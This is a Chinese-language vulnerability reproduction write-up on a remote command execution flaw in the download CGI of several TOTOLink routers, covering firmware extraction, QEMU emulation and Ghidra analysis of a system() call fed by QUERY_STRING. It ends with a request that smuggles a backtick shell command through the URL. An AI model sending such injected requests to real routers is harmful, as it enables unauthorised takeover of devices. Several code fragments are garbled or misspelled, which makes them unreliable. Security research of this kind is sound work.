## 漏洞描述

TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限

## 漏洞影响

TOTOLink 多个设备

## 漏洞复现

下载路由器固件

![](../Images/d0d7effdeb90a765026eb462e433f6f9.png)

使用binwalk分解固件

![](../Images/176aba6392723903fcf7b7caf6f2791c.png)

查看分解出来的文件

![](../Images/fa5825a89a0429a1e82c0eda8918ea81.png)![](../Images/9353a3113e3a043223d8565554352d5b.png)

使用qemu搭建路由器

```
#set network

"root=/dev/sda1"
 -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic
```

创建后在qemu里执行命令启动路由器

```
ifconfig eth0 192.168.6.11
 up 192.168.6.11

:/root/     var

/run/lighttpd.pid
```

注意 **lighttpd.conf** 文件需要修改 **server.pid-file** 参数

![](../Images/364322053475bcfbb48adf38a7b0e650.png)

启动后访问路由器页面

![](../Images/e652fbf70fd4cf912307e0e2b91bc320.png)

我们找到需要分析的文件目录 **squashfs-root/web\_cste/cgi-bin**

![](../Images/f6a0865e57657458736a061df84f6435.png)

使用Ghidra分析 cgi文件 **downloadFile.cgi**

![](../Images/538183229533f239e455810be1a01d5a.png)

我们注意到其中的system执行命令

```
pcVar1 = getenv("QUERY_STRING"

);"echo QUERY_STRING:%s >/tmp/download"

,pcVar1);
```

其中 getenv 从请求Url中获取参数,传参给pcVar1，再通过下面的sprintf 赋值给 acStack1424 使用 system函数 进行命令执行

![](../Images/316b25ceb7ce95639f802e580b9e9c95.png)

我们构造请求包控制 QUERY\_STRING 参数来进行恶意命令执行

```

/cgi-bin/downloadFlile.cgi?payload=`ls>../cmd.txt`
```
